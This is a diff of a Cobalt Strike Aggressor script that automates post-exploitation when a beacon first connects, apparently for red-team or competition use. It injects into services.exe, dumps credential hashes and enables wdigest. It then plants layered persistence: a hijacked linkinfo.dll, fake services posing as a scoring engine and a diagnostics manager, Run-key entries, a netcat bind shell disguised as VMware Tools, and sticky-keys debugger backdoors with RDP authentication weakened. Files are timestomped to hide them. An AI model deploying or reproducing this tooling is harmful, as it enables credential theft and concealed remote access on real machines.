@@ -1,55 +1,194 @@
 #################################################
 # Created by @jgaudard  :: I don't twitter much
 # Aggressor script for initial_beacon with cobaltstrike
-# Created: 29 Sept 2016 Modified: 14 Mar 2017
-# Version 1.5
+# Created: 29 Sept 2016 Modified: 28 Mar 2017
+# Version 2.0
 #################################################
 
-$listener = "remote - 443";
+$listener = "local - 443";
 
 sub getanypid {
-  bps($1, lambda({
-    local('$pid $name $entry');
-    foreach $entry (split("\n", $2)) {
-      ($name, $ppid, $pid) = split("\\s+", $entry);
-      if ($name eq $proc) {
-        # $1 is our Beacon ID, $pid is the PID of $proc
-        [$callback: $1, $proc, $pid];
-      }
-    }
-  }, $proc => $2, $callback => $3));
+    bps($1, lambda({
+        local('$pid $name $entry');
+        foreach $entry (split("\n", $2)) {
+            ($name, $ppid, $pid) = split("\\s+", $entry);
+            if ($name eq $proc) {
+                # $1 is our Beacon ID, $pid is the PID of $proc
+                [$callback: $1, $proc, $pid];
+            }
+        }
+    }, $proc => $2, $callback => $3));
 }
 
-sub persistence {  
-  if (beacon_info($1, 'is64') == 1) {  
-    ## do stuff;  
-  }  
-  else {  
-    ## do different stuff;  
-  }
-
-
-on beacon_initial {
-  local('$b');
-  bsleep($1, 15, 50);
-  $b = beacon_info($1, 'pid');
-  getanypid($1, "services.exe", lambda({
-    if ($3 != $b) {
-      if (beacon_info($1, 'is64') == 1) {
-        binject($1, $3, $listener, 'x64');
-      }
-      else {
-        binject($1, $3, $listener, 'x86');
-      }
-      bsleep($1, 240, 50);
+sub persist_linkinfo {
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("linkinfo.dll")) {
+            blog($1, "Setting up linkinfo.dll persistence.");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("linkinfo.dll"));
+            btimestomp($1, "linkinfo.dll", 'c:\\windows\\sysnative\\linkinfo.dll');
+        }
+        else {
+            berror($1, "linkinfo.dll not found.");
+        }
     }
     else {
-      bwdigest($1);
-      bhashdump($1);
-      bsleep($1, 30, 50);
-      persistence($1);
+        if (-exists script_resource("linkinfo32.dll")) {
+            blog($1, "Setting up linkinfo.dll persistence.");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("linkinfo32.dll"));
+            bshell($1, "move c:\\windows\\linkinfo32.dll c:\\windows\\linkinfo.dll");
+            btimestomp($1, "linkinfo.dll", 'c:\\windows\\sysnative\\linkinfo.dll');
+        }
+        else {
+            berror($1, "linkinfo32.dll not found.");
+        }
     }
-  },\$b));
 }
-
-
+sub persist_scorebot {
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("scorebot.exe")) {
+            blog($1, "Setting up Scorebot Service Persistence");
+            bcd($1, 'c:\windows\system32');
+            bupload($1, script_resource("scorebot.exe"));
+            btimestomp($1, "scorebot.exe", "cmd.exe");
+            bshell($1, 'sc delete scorebot');
+            bshell($1, 'sc create scorebot binPath= "C:\windows\scorebot.exe" start= auto DisplayName= "Scoring Engine Service"');
+            bshell($1, 'sc description scorebot "Scoring engine required for white team tracking uptime and services of the host."');
+            bshell($1, 'sc start scorebot');
+        }
+        else {
+            berror($1, "scorebot.exe does not exist :(");
+        }
+    }
+    else {
+        if (-exists script_resource("scorebot32.exe")) {
+            blog($1, "Setting up Scorebot Service Persistence");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("scorebot32.exe"));
+            btimestomp($1, "scorebot32.exe", ".\\system32\\cmd.exe");
+            bshell($1, 'sc delete scorebot');
+            bshell($1, 'sc create scorebot binPath= "C:\windows\scorebot32.exe" start= auto DisplayName= "Scoring Engine Service"');
+            bshell($1, 'sc description scorebot "Scoring engine required for white team tracking uptime and services of the host."');
+            bshell($1, 'sc start scorebot');
+        }
+        else {
+            berror($1, "scorebot.exe does not exist :(");
+        }  
+    }
+}
+sub persist_runkey_ie {
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("jsdbgui.exe")) {
+            blog($1, "Setting up run key persistence for jsdbgui.exe");
+            bcd($1, 'c:\\program files\\internet explorer');
+            bupload($1, script_resource("jsdbgui.exe"));
+            btimestomp($1, "jsdbgui.exe", "jsdbgui.dll");
+            bshell($1, 'REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Java Script Debug GUI" /t REG_SZ /d "C:\Program Files\Internet Explorer\jsdbgui.exe" /f');
+        }
+        else {
+            berror($1, "jsdbgui.exe does not exist :(");
+        }
+    }
+    else {
+        if (-exists script_resource("jsdbgui32.exe")) {
+            blog($1, "Setting up run key persistence for jsdbgui.exe");
+            bcd($1, 'c:\\program files\\internet explorer');
+            bupload($1, script_resource("jsdbgui32.exe"));
+            bshell($1, "move c:\\program files\\internet explorer\\jsdbgui32.exe c:\\program files\\internet explorer\\jsdbgui.exe");
+            btimestomp($1, "jsdbgui.exe", "jsdbgui.dll");
+            bshell($1, 'REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Java Script Debug GUI" /t REG_SZ /d "C:\Program Files\Internet Explorer\jsdbgui.exe" /f');
+        }
+        else {
+            berror($1, "jsdbgui32.exe does not exist :(");
+        }
+    }    
+}
+sub persist_runkey_netcat {
+    if (-exists script_resource("vmtools.exe")) {
+        blog($1, "Setting up run key persistence for vmtools.exe");
+        bcd($1, 'c:\\program files\\vmware\\vmware tools');
+        bupload($1, script_resource("vmtools.exe"));         ### copy /usr/share/windows-binaries/nc.exe to script directory
+        btimestomp($1, "vmtools.exe", "vmtoolsd.exe");
+        bshell($1, 'REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "VMware Tools" /t REG_SZ /d "C:\Program Files\Internet Explorer\vmtools.exe -lp 8080 -e cmd.exe" /f');
+    }
+    else {
+        berror($1, "vmtools.exe does not exist :(");
+    }
+}
+sub stickykeys {
+    binput($1, 'Running setup for StickyKeys');
+    bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
+    bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f');
+    bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f');
+    bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f');
+    bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d "0" /f');
+    bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f');
+    bshell($1, 'netsh firewall set service type = remotedesktop mode = enable');
+    bshell($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
+    bshell($1, 'net start TermService');
+    binput($1, 'Running setup for PSRemoting');
+    bpowershell($1, 'Enable-PSRemoting -Force');
+       
+}
+sub persist_diagsvc {
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("diagsvc.exe")) {
+            blog($1, "Setting up 'Diagnostic System Manager Service Persistence'");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("diagsvc.exe"));
+            btimestomp($1, "diagsvc.exe", "cmd.exe");
+            bshell($1, 'sc delete diagsvc');
+            bshell($1, 'sc create diagsvc binPath= "C:\windows\diagsvc.exe" start= auto DisplayName= "Diagnostic System Manager"');
+            bshell($1, 'sc description diagsvc "The Diagnostic System Manager is used by the Diagnostic System Host service to manage diagnostics and run in a system context. If this service is stopped any diagnostics that depend on it will no longer function."');
+        }
+        else {
+            berror($1, "diagsvc.exe does not exist :(");
+        }
+    }
+    else {
+        if (-exists script_resource("diagsvc32.exe")) {
+            blog($1, "Setting up 'Diagnostic System Manager Service Persistence'");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("diagsvc32.exe"));
+            btimestomp($1, "diagsvc32.exe", "cmd.exe");
+            bshell($1, 'sc delete diagsvc');
+            bshell($1, 'sc create diagsvc binPath= "C:\windows\diagsvc32.exe" start= auto DisplayName= "Diagnostic System Manager"');
+            bshell($1, 'sc description diagsvc "The Diagnostic System Manager is used by the Diagnostic System Host service to manage diagnostics and run in a system context. If this service is stopped any diagnostics that depend on it will no longer function."');
+        }
+        else {
+            berror($1, "diagsvc32.exe does not exist :(");
+        }
+    }    
+}
+sub persistence {
+    #if (some check == true then break before persisting
+    persist_linkinfo($1);
+    persist_scorebot($1);
+    persist_runkey_ie($1);
+    persist_runkey_netcat($1);
+    stickykeys($1);
+    persist_diagsvc($1);
+}
+on beacon_initial {
+    local('$b');
+    bsleep($1, 15, 50);
+    $b = beacon_info($1, 'pid');
+    getanypid($1, "services.exe", lambda({
+        if ($3 != $b) {
+            if (beacon_info($1, 'is64') == 1) {
+                binject($1, $3, $listener, 'x64');
+            }
+            else {
+                binject($1, $3, $listener, 'x86');
+            }
+            bsleep($1, 240, 50);
+        }
+        else {
+            bwdigest($1);
+            bhashdump($1);
+            bsleep($1, 30, 50);
+            persistence($1);
+        }
+    },\$b));
+}
